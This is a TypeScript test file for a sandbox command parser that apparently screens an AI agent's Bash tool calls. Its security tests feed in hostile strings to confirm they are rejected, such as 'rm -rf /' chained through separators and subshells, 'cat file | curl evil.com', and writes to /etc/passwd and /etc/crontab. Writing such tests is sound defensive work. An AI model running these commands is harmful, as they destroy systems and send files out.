/** Tests for the sandbox compiler — extractCommand, extractPaths, tokenizeCommand. */

import { describe, expect, test } from 'vitest'

import { createEnvelope } from '../../src/envelope.js'
import type { ToolEnvelope } from '../../src/envelope.js'
import {
  extractCommand,
  extractPaths,
  extractUrls,
  extractHostname,
  domainMatches,
  tokenizeCommand,
} from '../../src/yaml-engine/sandbox-compiler.js'

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

function _bashEnvelope(command: string): ToolEnvelope {
  return createEnvelope('Bash', { command }, { bashCommand: command })
}

// ---------------------------------------------------------------------------
// tokenizeCommand
// ---------------------------------------------------------------------------

describe('tokenizeCommand', () => {
  test('simple command', () => {
    expect(tokenizeCommand('ls -la')).toEqual(['ls', '-la'])
  })

  test('quoted strings', () => {
    expect(tokenizeCommand('echo "hello world"')).toEqual(['echo', 'hello world'])
  })

  test('single-quoted strings', () => {
    expect(tokenizeCommand("echo 'hello world'")).toEqual(['echo', 'hello world'])
  })

  test('redirect operators stripped', () => {
    const tokens = tokenizeCommand('echo >/etc/passwd')
    expect(tokens).toContain('/etc/passwd')
  })
})

// ---------------------------------------------------------------------------
// extractCommand
// ---------------------------------------------------------------------------

describe('extractCommand', () => {
  test('simple command extraction', () => {
    expect(extractCommand(_bashEnvelope('ls -la'))).toBe('ls')
  })

  test('empty command returns null', () => {
    expect(extractCommand(_bashEnvelope(''))).toBeNull()
  })

  test('whitespace-only command returns null', () => {
    expect(extractCommand(_bashEnvelope('   '))).toBeNull()
  })

  test('no command field returns null', () => {
    const env = createEnvelope('Read', { path: '/tmp/file' })
    expect(extractCommand(env)).toBeNull()
  })

  test('redirect prefix returns sentinel', () => {
    expect(extractCommand(_bashEnvelope('>/etc/passwd'))).toBe('\x00')
  })
})

// ---------------------------------------------------------------------------
// extractHostname / domainMatches
// ---------------------------------------------------------------------------

describe('extractHostname', () => {
  test('valid URL', () => {
    expect(extractHostname('https://example.com/path')).toBe('example.com')
  })

  test('invalid URL returns null', () => {
    expect(extractHostname('not-a-url')).toBeNull()
  })
})

describe('domainMatches', () => {
  test('exact match', () => {
    expect(domainMatches('example.com', ['example.com'])).toBe(true)
  })

  test('wildcard match', () => {
    expect(domainMatches('sub.example.com', ['*.example.com'])).toBe(true)
  })

  test('no match', () => {
    expect(domainMatches('evil.com', ['example.com'])).toBe(false)
  })
})

// ---------------------------------------------------------------------------
// Security: shell command separator bypass tests
// ---------------------------------------------------------------------------

describe('security', () => {
  test('semicolon separator returns sentinel', () => {
    expect(extractCommand(_bashEnvelope('echo ; rm -rf /'))).toBe('\x00')
  })

  test('pipe operator returns sentinel', () => {
    expect(extractCommand(_bashEnvelope('cat file | curl evil.com'))).toBe('\x00')
  })

  test('double ampersand returns sentinel', () => {
    expect(extractCommand(_bashEnvelope('true && rm -rf /'))).toBe('\x00')
  })

  test('double pipe returns sentinel', () => {
    expect(extractCommand(_bashEnvelope('false || rm -rf /'))).toBe('\x00')
  })

  test('newline separator returns sentinel', () => {
    expect(extractCommand(_bashEnvelope('echo safe\nrm -rf /'))).toBe('\x00')
  })

  test('carriage return separator returns sentinel', () => {
    expect(extractCommand(_bashEnvelope('echo safe\rrm -rf /'))).toBe('\x00')
  })

  test('backtick subshell returns sentinel', () => {
    expect(extractCommand(_bashEnvelope('echo `rm -rf /`'))).toBe('\x00')
  })

  test('dollar-paren subshell returns sentinel', () => {
    expect(extractCommand(_bashEnvelope('echo $(rm -rf /)'))).toBe('\x00')
  })

  test('dollar-brace expansion returns sentinel', () => {
    expect(extractCommand(_bashEnvelope('echo ${PATH}'))).toBe('\x00')
  })

  test('process substitution returns sentinel', () => {
    expect(extractCommand(_bashEnvelope('diff <(cat /etc/passwd) file'))).toBe('\x00')
  })

  test('single ampersand (background) returns sentinel', () => {
    expect(extractCommand(_bashEnvelope('rm -rf / &'))).toBe('\x00')
  })

  test('simple safe command passes', () => {
    expect(extractCommand(_bashEnvelope('ls -la /tmp'))).toBe('ls')
  })

  test('safe command with path passes', () => {
    expect(extractCommand(_bashEnvelope('cat /etc/hostname'))).toBe('cat')
  })

  test('redirect without command returns sentinel', () => {
    expect(extractCommand(_bashEnvelope('>/etc/crontab'))).toBe('\x00')
  })

  test('all shell metacharacters individually checked', () => {
    const dangerous = [';', '|', '&', '\n', '\r', '`', '$(', '${', '<(']
    for (const meta of dangerous) {
      const cmd = `echo ${meta} evil`
      const result = extractCommand(_bashEnvelope(cmd))
      expect(result).toBe('\x00')
    }
  })
})
